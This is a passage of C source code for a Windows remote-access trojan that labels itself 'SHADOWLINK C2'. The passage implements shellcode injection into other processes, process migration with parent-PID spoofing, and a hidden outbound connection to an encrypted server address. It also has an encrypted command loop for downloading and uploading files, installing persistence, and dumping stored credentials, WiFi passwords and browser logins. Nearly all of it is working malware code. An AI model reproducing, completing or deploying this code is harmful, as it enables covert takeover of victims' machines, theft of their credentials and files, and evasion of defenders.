    if (snapshot == INVALID_HANDLE_VALUE) {
        snprintf(output, output_size, "[!] Failed to enumerate processes\n");
        return -1;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    size_t offset = 0;
    offset += snprintf(output + offset, output_size - offset,
        "========================================\n"
        "   INJECTION TARGETS\n"
        "========================================\n\n"
        "%-8s %-25s %s\n"
        "-------- ------------------------- --------\n",
        "PID", "PROCESS", "STATUS");
    
    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return (int)offset;
    }
    
    do {
        if (offset >= output_size - 200) break;
        
        char procName[MAX_PATH];
        strncpy(procName, pe32.szExeFile, MAX_PATH - 1);
        for (int i = 0; procName[i]; i++) {
            procName[i] = tolower(procName[i]);
        }
        
        // Check if this is a good target
        for (int i = 0; good_targets[i] != NULL; i++) {
            if (strcmp(procName, good_targets[i]) == 0) {
                // Try to open with required permissions
                HANDLE hProc = OpenProcess(
                    PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                    PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                    FALSE, pe32.th32ProcessID);
                
                const char *status = (hProc != NULL) ? "AVAILABLE" : "PROTECTED";
                if (hProc) CloseHandle(hProc);
                
                offset += snprintf(output + offset, output_size - offset,
                    "%-8lu %-25s %s\n",
                    pe32.th32ProcessID, pe32.szExeFile, status);
                break;
            }
        }
    } while (Process32Next(snapshot, &pe32));
    
    CloseHandle(snapshot);
    
    offset += snprintf(output + offset, output_size - offset,
        "\n[*] Use: inject <pid> to inject into target\n");
    
    return (int)offset;
}

// Classic process injection
// Injects shellcode into target process and executes it
int inject_into_process(DWORD target_pid, unsigned char *shellcode, size_t shellcode_size) {
    // 1. Open target process with required permissions
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, target_pid);
    
    if (hProcess == NULL) {
        return -1;  // Cannot open process
    }
    
    // 2. Allocate memory in target process
    void *pRemoteCode = VirtualAllocEx(
        hProcess,
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    
    if (pRemoteCode == NULL) {
        CloseHandle(hProcess);
        return -2;  // Cannot allocate memory
    }
    
    // 3. Write shellcode to allocated memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteCode, shellcode, shellcode_size, &bytesWritten)) {
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -3;  // Cannot write memory
    }
    
    // 4. Create remote thread to execute shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pRemoteCode,
        NULL,
        0,
        NULL);
    
    if (hThread == NULL) {
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -4;  // Cannot create thread
    }
    
    // 5. Optionally wait for completion
    // WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return 0;  // Success
}

// ============================================
// FULL PROCESS MIGRATION
// ============================================
// Technique: Spawn new hidden agent in target process context
// then terminate ourselves

// Get current executable path
static char g_current_exe_path[MAX_PATH] = {0};

void init_exe_path(void) {
    if (g_current_exe_path[0] == '\0') {
        GetModuleFileNameA(NULL, g_current_exe_path, MAX_PATH);
    }
}

// Spawn agent in context of another process using CreateProcess with PPID spoofing
// This makes our new agent appear as a child of the target process
int spawn_agent_with_ppid(DWORD parent_pid, char *result, size_t result_size) {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    HANDLE hParentProcess = NULL;
    
    init_exe_path();
    
    // Open parent process
    hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
    if (hParentProcess == NULL) {
        snprintf(result, result_size, "[-] Cannot open parent process %lu (err=%lu)\n", 
            parent_pid, GetLastError());
        return -1;
    }
    
    // Initialize STARTUPINFOEX
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    
    // Calculate attribute list size
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 0, attributeSize);
    
    if (si.lpAttributeList == NULL) {
        CloseHandle(hParentProcess);
        snprintf(result, result_size, "[-] Memory allocation failed\n");
        return -2;
    }
    
    // Initialize attribute list
    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize)) {
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParentProcess);
        snprintf(result, result_size, "[-] Failed to init attribute list\n");
        return -3;
    }
    
    // Set parent process attribute (PPID spoofing)
    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, 
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParentProcess);
        snprintf(result, result_size, "[-] Failed to set parent attribute\n");
        return -4;
    }
    
    // Create new process with spoofed PPID
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessA(
        g_current_exe_path,     // Our own executable
        NULL,                    // Command line
        NULL,                    // Process security
        NULL,                    // Thread security
        FALSE,                   // Inherit handles
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | DETACHED_PROCESS,
        NULL,                    // Environment
        NULL,                    // Current directory
        (LPSTARTUPINFOA)&si,    // Startup info
        &pi                      // Process info
    )) {
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParentProcess);
        snprintf(result, result_size, "[-] Failed to create process (err=%lu)\n", GetLastError());
        return -5;
    }
    
    // Success - new agent spawned with spoofed parent
    snprintf(result, result_size,
        "[+] Migration successful!\n"
        "    New agent PID: %lu\n"
        "    Parent PID: %lu (spoofed)\n"
        "    Original will terminate...\n",
        pi.dwProcessId, parent_pid);
    
    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(hParentProcess);
    
    return (int)pi.dwProcessId;  // Return new PID
}


// Full migration using Process Hollowing technique
// Creates a suspended legitimate process and replaces its memory with our code
int process_hollowing_migrate(const char *target_exe, char *result, size_t result_size) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    PVOID pImageBase = NULL;
    DWORD dwOldProtect;
    
    init_exe_path();
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    
    // 1. Create target process in SUSPENDED state
    if (!CreateProcessA(
        target_exe,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        snprintf(result, result_size, "[-] Failed to create suspended process\n");
        return -1;
    }
    
    snprintf(result, result_size,
        "[*] Process Hollowing Migration\n"
        "    Target: %s\n"
        "    Suspended PID: %lu\n"
        "    [!] Full hollowing requires PE parsing\n"
        "    [*] Using PPID spoof method instead...\n\n",
        target_exe, pi.dwProcessId);
    
    // For true hollowing, we'd need to:
    // - Read our own PE headers
    // - Unmap target's image (NtUnmapViewOfSection)
    // - Allocate memory in target at preferred base
    // - Write our PE sections
    // - Fix relocations if needed
    // - Set entry point in thread context
    // - Resume thread
    
    // This is complex, so we terminate and use PPID spoofing instead
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return -100;  // Indicate fallback needed
}


// Main migration function - tries best available technique
int full_migrate(const char *target, char *result, size_t result_size) {
    DWORD target_pid = 0;
    size_t offset = 0;
    
    offset += snprintf(result + offset, result_size - offset,
        "╔══════════════════════════════════════╗\n"
        "║     FULL PROCESS MIGRATION           ║\n"
        "╚══════════════════════════════════════╝\n\n");
    
    // Check if target is a PID or process name
    if (isdigit(target[0])) {
        target_pid = (DWORD)atoi(target);
    } else {
        // Find process by name
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    if (_stricmp(pe32.szExeFile, target) == 0) {
                        target_pid = pe32.th32ProcessID;
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }
    }
    
    if (target_pid == 0) {
        offset += snprintf(result + offset, result_size - offset,
            "[-] Target process not found: %s\n", target);
        return -1;
    }
    
    // Don't migrate into ourselves
    if (target_pid == GetCurrentProcessId()) {
        offset += snprintf(result + offset, result_size - offset,
            "[-] Cannot migrate into self!\n");
        return -1;
    }
    
    offset += snprintf(result + offset, result_size - offset,
        "[*] Target: %s (PID: %lu)\n"
        "[*] Technique: PPID Spoofing + New Instance\n\n",
        target, target_pid);
    
    // Use PPID spoofing - spawn new agent with target as parent
    char spawn_result[1024];
    int new_pid = spawn_agent_with_ppid(target_pid, spawn_result, sizeof(spawn_result));
    
    offset += snprintf(result + offset, result_size - offset, "%s", spawn_result);
    
    if (new_pid > 0) {
        offset += snprintf(result + offset, result_size - offset,
            "\n[+] Migration complete!\n"
            "[*] New agent will connect shortly\n"
            "[!] This instance will terminate\n");
        return new_pid;
    }
    
    return -1;
}


// Simple MessageBox shellcode for testing (x64)
// This is a harmless test payload that just shows a message box
unsigned char test_shellcode[] = {
    // This is just a placeholder - real shellcode would go here
    // For safety, we'll use a simple infinite loop that does nothing
    0xEB, 0xFE  // jmp short $-2 (infinite loop)
};
size_t test_shellcode_size = sizeof(test_shellcode);

// Migrate: inject our agent code into another process
// This is a simplified version - full migration is complex
int migrate_to_process(DWORD target_pid, char *result, size_t result_size) {
    // Use full migration instead
    char pid_str[16];
    snprintf(pid_str, sizeof(pid_str), "%lu", target_pid);
    return full_migrate(pid_str, result, result_size);
}


// ============================================
// PROCESS MANAGEMENT
// ============================================

// Liste tous les processus en cours
int list_processes(char *output, size_t output_size) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        snprintf(output, output_size, "[!] Failed to create process snapshot\n");
        return -1;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        snprintf(output, output_size, "[!] Failed to get first process\n");
        return -1;
    }
    
    size_t offset = 0;
    offset += snprintf(output + offset, output_size - offset,
        "\n%-8s %-8s %-40s\n", "PID", "PPID", "NAME");
    offset += snprintf(output + offset, output_size - offset,
        "-------- -------- ----------------------------------------\n");
    
    do {
        if (offset >= output_size - 100) break;  // Éviter overflow
        
        offset += snprintf(output + offset, output_size - offset,
            "%-8lu %-8lu %-40s\n",
            pe32.th32ProcessID,
            pe32.th32ParentProcessID,
            pe32.szExeFile);
            
    } while (Process32Next(snapshot, &pe32));
    
    CloseHandle(snapshot);
    return (int)offset;
}

// Tue un processus par son PID
int kill_process(DWORD pid) {
    // Ne pas se tuer soi-même
    if (pid == GetCurrentProcessId()) {
        return -2;  // Code spécial
    }
    
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) {
        return -1;
    }
    
    BOOL result = TerminateProcess(hProcess, 0);
    CloseHandle(hProcess);
    
    return result ? 0 : -1;
}


// ============================================
// FILE TRANSFER
// ============================================

// Lit un fichier et l'envoie au serveur (download depuis l'agent)
int send_file_to_server(SOCKET sock, const char *filepath) {
    FILE *fp = fopen(filepath, "rb");
    if (fp == NULL) {
        return -1;  // Fichier introuvable
    }
    
    // Obtenir la taille du fichier
    fseek(fp, 0, SEEK_END);
    long filesize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    // Envoyer d'abord les métadonnées: "OK:<size>"
    char meta[64];
    snprintf(meta, sizeof(meta), "OK:%ld", filesize);
    uint8_t encrypted_meta[128];
    size_t meta_len = aes_encrypt((uint8_t*)meta, strlen(meta), encrypted_meta);
    send(sock, (char*)encrypted_meta, meta_len, 0);
    
    // Attendre l'ACK du serveur
    char ack[64];
    int ack_len = recv(sock, ack, sizeof(ack), 0);
    if (ack_len <= 0) {
        fclose(fp);
        return -2;
    }
    
    // Lire et envoyer le fichier par chunks
    uint8_t buffer[FILE_CHUNK_SIZE];
    uint8_t encrypted[FILE_CHUNK_SIZE + 32];  // +32 pour padding + IV
    size_t bytes_read;
    long total_sent = 0;
    
    while ((bytes_read = fread(buffer, 1, FILE_CHUNK_SIZE - 32, fp)) > 0) {
        size_t encrypted_len = aes_encrypt(buffer, bytes_read, encrypted);
        
        // Envoyer la taille du chunk d'abord (4 bytes)
        uint32_t chunk_size = (uint32_t)encrypted_len;
        send(sock, (char*)&chunk_size, sizeof(chunk_size), 0);
        
        // Envoyer le chunk chiffré
        send(sock, (char*)encrypted, encrypted_len, 0);
        
        total_sent += bytes_read;
    }
    
    // Envoyer un chunk de taille 0 pour indiquer la fin
    uint32_t end_marker = 0;
    send(sock, (char*)&end_marker, sizeof(end_marker), 0);
    
    fclose(fp);
    return 0;
}

// Reçoit un fichier du serveur et le sauvegarde (upload vers l'agent)
int receive_file_from_server(SOCKET sock, const char *filepath) {
    // Recevoir les métadonnées: taille attendue
    char meta[128];
    int meta_len = recv(sock, meta, sizeof(meta), 0);
    if (meta_len <= 0) {
        return -1;
    }
    
    // Déchiffrer les métadonnées
    uint8_t decrypted_meta[128];
    size_t dec_len = aes_decrypt((uint8_t*)meta, meta_len, decrypted_meta);
    decrypted_meta[dec_len] = '\0';
    
    // Parser la taille: "SIZE:<size>"
    long expected_size = 0;
    if (strncmp((char*)decrypted_meta, "SIZE:", 5) == 0) {
        expected_size = atol((char*)decrypted_meta + 5);
    }
    
    // Ouvrir le fichier en écriture
    FILE *fp = fopen(filepath, "wb");
    if (fp == NULL) {
        // Envoyer erreur
        const char *err = "ERROR:Cannot create file";
        uint8_t encrypted_err[128];
        size_t err_len = aes_encrypt((uint8_t*)err, strlen(err), encrypted_err);
        send(sock, (char*)encrypted_err, err_len, 0);
        return -2;
    }
    
    // Envoyer ACK
    const char *ack = "READY";
    uint8_t encrypted_ack[64];
    size_t ack_len = aes_encrypt((uint8_t*)ack, strlen(ack), encrypted_ack);
    send(sock, (char*)encrypted_ack, ack_len, 0);
    
    // Recevoir les chunks
    uint8_t encrypted_chunk[FILE_CHUNK_SIZE + 32];
    uint8_t decrypted_chunk[FILE_CHUNK_SIZE];
    long total_received = 0;
    
    while (1) {
        // Recevoir la taille du chunk
        uint32_t chunk_size;
        int size_recv = recv(sock, (char*)&chunk_size, sizeof(chunk_size), 0);
        if (size_recv != sizeof(chunk_size) || chunk_size == 0) {
            break;  // Fin du transfert
        }
        
        // Recevoir le chunk
        int bytes_received = 0;
        while (bytes_received < (int)chunk_size) {
            int r = recv(sock, (char*)encrypted_chunk + bytes_received, 
                        chunk_size - bytes_received, 0);
            if (r <= 0) break;
            bytes_received += r;
        }
        
        // Déchiffrer et écrire
        size_t dec_chunk_len = aes_decrypt(encrypted_chunk, chunk_size, decrypted_chunk);
        fwrite(decrypted_chunk, 1, dec_chunk_len, fp);
        total_received += dec_chunk_len;
    }
    
    fclose(fp);
    return (total_received > 0) ? 0 : -3;
}


// ============================================
// CONNEXION AU SERVEUR
// ============================================

SOCKET connect_to_server() {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    if (sock == INVALID_SOCKET) {
        return INVALID_SOCKET;
    }
    
    // Déchiffrer l'IP du serveur à la volée
    char *server_ip = get_decrypted_server_ip();
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);
    
    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        closesocket(sock);
        return INVALID_SOCKET;
    }
    
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return INVALID_SOCKET;
    }
    
    return sock;
}


// ============================================
// BOUCLE DE COMMANDES
// ============================================

void command_loop(SOCKET sock) {
    while (1) {
        char commandBuffer[BUFFER_SIZE];
        int commandBytes = recv(sock, commandBuffer, sizeof(commandBuffer) - 1, 0);
        
        if (commandBytes <= 0) {
            printf("[*] Connection lost\n");
            break;
        }
        
        // Déchiffrement
        uint8_t decryptedCommand[BUFFER_SIZE];
        size_t decrypted_len = aes_decrypt((uint8_t*)commandBuffer, commandBytes, decryptedCommand);
        decryptedCommand[decrypted_len] = '\0';
        printf("[*] Received command: %s\n", (char*)decryptedCommand);

        // Commande EXIT
        if (strcmp((char*)decryptedCommand, "exit") == 0) {
            printf("[*] Exit command received\n");
            return;  // Sort de la boucle, permettra reconnexion
        }
        
        // ============================================
        // PROCESS MANAGEMENT COMMANDS
        // ============================================
        
        // Commande PS - Lister les processus
        if (strcmp((char*)decryptedCommand, "ps") == 0) {
            printf("[*] Listing processes...\n");
            char *procBuffer = (char*)malloc(RECON_BUFFER_SIZE);
            if (procBuffer == NULL) {
                const char *errorMsg = "[!] Memory allocation failed\n";
                uint8_t encryptedError[BUFFER_SIZE];
                size_t encrypted_len = aes_encrypt((uint8_t*)errorMsg, strlen(errorMsg), encryptedError);
                send(sock, (char*)encryptedError, encrypted_len, 0);
            } else {
                int len = list_processes(procBuffer, RECON_BUFFER_SIZE);
                if (len > 0) {
                    uint8_t *encryptedProc = (uint8_t*)malloc(RECON_BUFFER_SIZE + 32);
                    if (encryptedProc) {
                        size_t encrypted_len = aes_encrypt((uint8_t*)procBuffer, strlen(procBuffer), encryptedProc);
                        send(sock, (char*)encryptedProc, encrypted_len, 0);
                        free(encryptedProc);
                    }
                }
                free(procBuffer);
            }
            continue;
        }
        
        // Commande KILL <pid> - Tuer un processus
        if (strncmp((char*)decryptedCommand, "kill ", 5) == 0) {
            DWORD pid = (DWORD)atoi((char*)decryptedCommand + 5);
            printf("[*] Killing process %lu...\n", pid);
            
            const char *msg;
            int result = kill_process(pid);
            char msgBuffer[128];
            
            if (result == 0) {
                snprintf(msgBuffer, sizeof(msgBuffer), "[+] Process %lu terminated\n", pid);
                msg = msgBuffer;
            } else if (result == -2) {
                msg = "[!] Cannot kill self\n";
            } else {
                snprintf(msgBuffer, sizeof(msgBuffer), "[!] Failed to kill process %lu (access denied or not found)\n", pid);
                msg = msgBuffer;
            }
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // ============================================
        // FILE TRANSFER COMMANDS
        // ============================================
        
        // Commande DOWNLOAD <filepath> - Télécharger un fichier depuis l'agent
        if (strncmp((char*)decryptedCommand, "download ", 9) == 0) {
            const char *filepath = (char*)decryptedCommand + 9;
            printf("[*] Sending file: %s\n", filepath);
            
            int result = send_file_to_server(sock, filepath);
            
            if (result == -1) {
                const char *err = "ERROR:File not found";
                uint8_t encrypted[BUFFER_SIZE];
                size_t encrypted_len = aes_encrypt((uint8_t*)err, strlen(err), encrypted);
                send(sock, (char*)encrypted, encrypted_len, 0);
            } else if (result == 0) {
                printf("[+] File sent successfully\n");
            }
            continue;
        }
        
        // Commande UPLOAD <filepath> - Recevoir un fichier du serveur
        if (strncmp((char*)decryptedCommand, "upload ", 7) == 0) {
            const char *filepath = (char*)decryptedCommand + 7;
            printf("[*] Receiving file: %s\n", filepath);
            
            int result = receive_file_from_server(sock, filepath);
            
            const char *msg;
            char msgBuffer[256];
            if (result == 0) {
                snprintf(msgBuffer, sizeof(msgBuffer), "[+] File saved: %s\n", filepath);
                msg = msgBuffer;
            } else {
                snprintf(msgBuffer, sizeof(msgBuffer), "[!] Failed to receive file (error %d)\n", result);
                msg = msgBuffer;
            }
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande PERSIST - Installer la persistance
        if (strcmp((char*)decryptedCommand, "persist") == 0) {
            const char *msg;
            if (install_persistence() == 0) {
                msg = "[+] Persistence installed successfully\n";
            } else {
                msg = "[!] Failed to install persistence\n";
            }
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande UNPERSIST - Supprimer la persistance
        if (strcmp((char*)decryptedCommand, "unpersist") == 0) {
            const char *msg;
            if (remove_persistence() == 0) {
                msg = "[+] Persistence removed successfully\n";
            } else {
                msg = "[!] Failed to remove persistence\n";
            }
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande CHECKPERSIST - Vérifier la persistance
        if (strcmp((char*)decryptedCommand, "checkpersist") == 0) {
            const char *msg;
            if (check_persistence()) {
                msg = "[+] Persistence is ACTIVE\n";
            } else {
                msg = "[-] Persistence is NOT installed\n";
            }
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande DIE - Tuer l'agent définitivement (pas de reconnexion)
        if (strcmp((char*)decryptedCommand, "die") == 0) {
            const char *msg = "[*] Agent terminating permanently...\n";
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        
        // ============================================
        // CREDENTIAL DUMPING COMMANDS (Phase 9)
        // ============================================
        
        // Commande CREDS - Dump all credentials
        if (strcmp((char*)decryptedCommand, "creds") == 0) {
            printf("[*] Dumping credentials...\n");
            char *credsBuffer = (char*)malloc(RECON_BUFFER_SIZE);
            if (credsBuffer == NULL) {
                const char *errorMsg = "[!] Memory allocation failed\n";
                uint8_t encryptedError[BUFFER_SIZE];
                size_t encrypted_len = aes_encrypt((uint8_t*)errorMsg, strlen(errorMsg), encryptedError);
                send(sock, (char*)encryptedError, encrypted_len, 0);
            } else {
                dump_all_credentials(credsBuffer, RECON_BUFFER_SIZE);
                printf("[*] Credentials dump complete, sending...\n");
                uint8_t *encryptedCreds = (uint8_t*)malloc(RECON_BUFFER_SIZE + 32);
                if (encryptedCreds) {
                    size_t encrypted_len = aes_encrypt((uint8_t*)credsBuffer, strlen(credsBuffer), encryptedCreds);
                    send(sock, (char*)encryptedCreds, encrypted_len, 0);
                    free(encryptedCreds);
                }
                free(credsBuffer);
            }
            continue;
        }
        
        // Commande WIFI - Dump WiFi passwords only
        if (strcmp((char*)decryptedCommand, "wifi") == 0) {
            printf("[*] Dumping WiFi passwords...\n");
            char *wifiBuffer = (char*)malloc(RECON_BUFFER_SIZE);
            if (wifiBuffer == NULL) {
                const char *errorMsg = "[!] Memory allocation failed\n";
                uint8_t encryptedError[BUFFER_SIZE];
                size_t encrypted_len = aes_encrypt((uint8_t*)errorMsg, strlen(errorMsg), encryptedError);
                send(sock, (char*)encryptedError, encrypted_len, 0);
            } else {
                dump_wifi_passwords(wifiBuffer, RECON_BUFFER_SIZE);
                uint8_t *encryptedWifi = (uint8_t*)malloc(RECON_BUFFER_SIZE + 32);
                if (encryptedWifi) {
                    size_t encrypted_len = aes_encrypt((uint8_t*)wifiBuffer, strlen(wifiBuffer), encryptedWifi);
                    send(sock, (char*)encryptedWifi, encrypted_len, 0);
                    free(encryptedWifi);
                }
                free(wifiBuffer);
            }
            continue;
        }
        
        // Commande BROWSERS - Check browser credential files
        if (strcmp((char*)decryptedCommand, "browsers") == 0) {
            printf("[*] Checking browser credentials...\n");
            char *browserBuffer = (char*)malloc(BUFFER_SIZE * 4);
            if (browserBuffer == NULL) {
                const char *errorMsg = "[!] Memory allocation failed\n";
                uint8_t encryptedError[BUFFER_SIZE];
                size_t encrypted_len = aes_encrypt((uint8_t*)errorMsg, strlen(errorMsg), encryptedError);
                send(sock, (char*)encryptedError, encrypted_len, 0);
            } else {
                dump_browser_credentials(browserBuffer, BUFFER_SIZE * 4);
                uint8_t *encryptedBrowser = (uint8_t*)malloc(BUFFER_SIZE * 4 + 32);
                if (encryptedBrowser) {
                    size_t encrypted_len = aes_encrypt((uint8_t*)browserBuffer, strlen(browserBuffer), encryptedBrowser);
                    send(sock, (char*)encryptedBrowser, encrypted_len, 0);
                    free(encryptedBrowser);
                }
                free(browserBuffer);
            }
            continue;
        }
        
        // ============================================
        // PROCESS INJECTION COMMANDS (Phase 9b)
        // ============================================
        
        // Commande TARGETS - List injection targets
        if (strcmp((char*)decryptedCommand, "targets") == 0) {
            printf("[*] Listing injection targets...\n");
            char *targetBuffer = (char*)malloc(BUFFER_SIZE * 4);
            if (targetBuffer == NULL) {
                const char *errorMsg = "[!] Memory allocation failed\n";
                uint8_t encryptedError[BUFFER_SIZE];
                size_t encrypted_len = aes_encrypt((uint8_t*)errorMsg, strlen(errorMsg), encryptedError);
                send(sock, (char*)encryptedError, encrypted_len, 0);
            } else {
                list_injection_targets(targetBuffer, BUFFER_SIZE * 4);
                uint8_t *encryptedTargets = (uint8_t*)malloc(BUFFER_SIZE * 4 + 32);
                if (encryptedTargets) {
                    size_t encrypted_len = aes_encrypt((uint8_t*)targetBuffer, strlen(targetBuffer), encryptedTargets);
                    send(sock, (char*)encryptedTargets, encrypted_len, 0);
                    free(encryptedTargets);
                }
                free(targetBuffer);
            }
            continue;
        }
        
        // Commande INJECT <pid> - Inject into process
        if (strncmp((char*)decryptedCommand, "inject ", 7) == 0) {
            DWORD target_pid = (DWORD)atoi((char*)decryptedCommand + 7);
            printf("[*] Injecting into PID %lu...\n", target_pid);
            
            char resultBuffer[2048];
            int new_pid = full_migrate((char*)decryptedCommand + 7, resultBuffer, sizeof(resultBuffer));
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)resultBuffer, strlen(resultBuffer), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            
            // If migration successful, terminate ourselves
            if (new_pid > 0) {
                Sleep(500);  // Give time for response to send
                closesocket(sock);
                WSACleanup();
                ExitProcess(0);  // Clean exit - new agent takes over
            }
            continue;
        }
        
        // Commande MIGRATE <process_name> - Find and inject into named process
        if (strncmp((char*)decryptedCommand, "migrate ", 8) == 0) {
            const char *target_name = (char*)decryptedCommand + 8;
            printf("[*] Looking for process: %s\n", target_name);
            
            char resultBuffer[2048];
            int new_pid = full_migrate(target_name, resultBuffer, sizeof(resultBuffer));
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)resultBuffer, strlen(resultBuffer), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            
            // If migration successful, terminate ourselves
            if (new_pid > 0) {
                Sleep(500);  // Give time for response to send
                closesocket(sock);
                WSACleanup();
                ExitProcess(0);  // Clean exit - new agent takes over
            }
            continue;
        }
        
        // Commande RECON
        if (strcmp((char*)decryptedCommand, "recon") == 0) {
            printf("[*] Executing recon...\n");
            char *reconBuffer = (char*)malloc(RECON_BUFFER_SIZE);
            if (reconBuffer == NULL) {
                const char *errorMsg = "[!] Memory allocation failed\n";
                uint8_t encryptedError[BUFFER_SIZE];
                size_t encrypted_len = aes_encrypt((uint8_t*)errorMsg, strlen(errorMsg), encryptedError);
                send(sock, (char*)encryptedError, encrypted_len, 0);
            } else {
                int reconLen = do_recon(reconBuffer, RECON_BUFFER_SIZE);
                if (reconLen > 0) {
                    printf("[*] Recon complete, sending %d bytes...\n", reconLen);
                    uint8_t *encryptedRecon = (uint8_t*)malloc(RECON_BUFFER_SIZE + 32);
                    if (encryptedRecon) {
                        size_t encrypted_len = aes_encrypt((uint8_t*)reconBuffer, strlen(reconBuffer), encryptedRecon);
                        send(sock, (char*)encryptedRecon, encrypted_len, 0);
                        free(encryptedRecon);
                    }
                } else {
                    const char *errorMsg = "[!] Recon failed\n";
                    uint8_t encryptedError[BUFFER_SIZE];
                    size_t encrypted_len = aes_encrypt((uint8_t*)errorMsg, strlen(errorMsg), encryptedError);
                    send(sock, (char*)encryptedError, encrypted_len, 0);
                }
                free(reconBuffer);
            }
            continue;
        }
        
        // Commande HELP
        if (strcmp((char*)decryptedCommand, "help") == 0) {
            const char *helpMsg = 
                "========================================\n"
                "   SHADOWLINK C2 - COMMANDS (Phase 8)\n"
                "========================================\n"
                "  PROCESS MANAGEMENT:\n"
                "    ps             - List all processes\n"
                "    kill <pid>     - Kill a process by PID\n"
                "\n"
